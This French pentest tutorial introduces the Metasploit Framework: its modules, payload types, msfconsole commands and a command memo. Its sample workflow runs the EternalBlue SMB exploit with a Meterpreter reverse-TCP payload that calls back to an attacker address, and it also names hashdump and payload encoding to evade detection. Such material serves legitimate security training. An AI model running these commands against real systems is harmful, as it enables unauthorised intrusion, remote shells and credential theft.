# Introduction au Metasploit Framework

Metasploit est la plateforme de pentest la plus utilisee au monde. Developpee en Ruby, elle regroupe des milliers d'exploits, de payloads et de modules auxiliaires dans un framework unifie. Que ce soit pour scanner un reseau, exploiter une vulnerabilite, generer un payload ou pivoter dans un environnement interne, Metasploit est souvent le premier outil lance.

## Pourquoi

Metasploit permet de passer de la decouverte d'une vulnerabilite a son exploitation en quelques commandes. Son systeme modulaire facilite la combinaison exploit + payload + cible, et sa base de donnees integree permet de suivre l'avancement d'un pentest sur de nombreuses cibles simultanement. C'est un multiplicateur de productivite pour le pentester.

## Comment ca marche

### Architecture du framework

```
Metasploit Framework
|-- Modules
|   |-- Exploits    : code d'exploitation de vulnerabilites
|   |-- Payloads    : code execute sur la cible apres exploitation
|   |-- Auxiliary   : scan, enum, fuzzing, brute force
|   |-- Post        : post-exploitation (enum, pivoting, persistence)
|   |-- Encoders    : encodage des payloads pour eviter la detection
|   |-- NOPs        : remplissage pour maintenir la taille des payloads
|-- Plugins         : extensions (OpenVAS, Nessus, etc.)
|-- Database        : PostgreSQL pour stocker les resultats
```

### Types de modules

| Type | Description | Exemple |
|---|---|---|
| Exploit | Exploite une vulnerabilite pour livrer un payload | `exploit/windows/smb/ms17_010_eternalblue` |
| Payload | Code execute sur la cible | `windows/x64/meterpreter/reverse_tcp` |
| Auxiliary | Scan, enum, brute force (pas d'exploitation) | `auxiliary/scanner/smb/smb_version` |
| Post | Post-exploitation | `post/windows/gather/hashdump` |
| Encoder | Encode le payload | `x86/shikata_ga_nai` |

### Payloads : singles, stagers et stages

| Type | Description | Exemple |
|---|---|---|
| **Single** | Payload autonome, execute en une seule etape | `windows/shell_reverse_tcp` |
| **Stager** | Petit code qui etablit la connexion et charge le stage | `windows/x64/meterpreter/reverse_tcp` (le `/` separe stager et stage) |
| **Stage** | Code principal charge par le stager (Meterpreter, shell, VNC) | Charge en memoire apres connexion |

{% hint style="info" %}
La convention de nommage des payloads indique le type : un payload avec un `/` dans le nom (ex: `windows/meterpreter/reverse_tcp`) est un stager + stage. Sans `/` (ex: `windows/meterpreter_reverse_tcp` avec underscore), c'est un single. Les stagers sont plus petits et plus fiables a travers les firewalls.
{% endhint %}

## En pratique

### Lancer msfconsole

```bash
# - Demarrer avec la base de donnees
sudo msfdb init
msfconsole

# - Commandes de base
msf6 > help                    # aide complete
msf6 > search eternalblue      # chercher un module
msf6 > use 0                   # selectionner par index
msf6 > info                    # details du module
msf6 > options                 # voir les options requises
msf6 > set RHOSTS <IP_CIBLE>   # configurer la cible
msf6 > run                     # executer
```

### Workflow type

```bash
# 1 - Configurer la base de donnees
msf6 > db_status
msf6 > workspace -a pentest_inlane

# 2 - Scanner et importer
msf6 > db_nmap -sC -sV -p- <IP_CIBLE>
msf6 > hosts
msf6 > services

# 3 - Chercher un exploit
msf6 > search type:exploit platform:windows smb

# 4 - Configurer et lancer
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <IP_CIBLE>
msf6 > set LHOST <IP_ATTAQUANT>
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > run
```

## Retour terrain

Metasploit est incontournable pour le pentest. Il excelle dans trois domaines : le scan automatise de vulnerabilites connues, l'exploitation rapide avec gestion des sessions, et la post-exploitation avec Meterpreter. Son point faible : les exploits Metasploit sont tres detectes par les antivirus modernes. En environnement avec EDR, il faut souvent combiner Metasploit avec des techniques d'evasion ou utiliser des payloads custom.

## Memo express

| Commande | Usage |
|---|---|
| `search <terme>` | Chercher un module |
| `use <module>` | Selectionner un module |
| `options` / `show options` | Voir les parametres |
| `set <PARAM> <valeur>` | Configurer un parametre |
| `run` / `exploit` | Executer le module |
| `back` | Revenir au contexte principal |
| `sessions` | Lister les sessions actives |
| `sessions -i <N>` | Interagir avec une session |

***
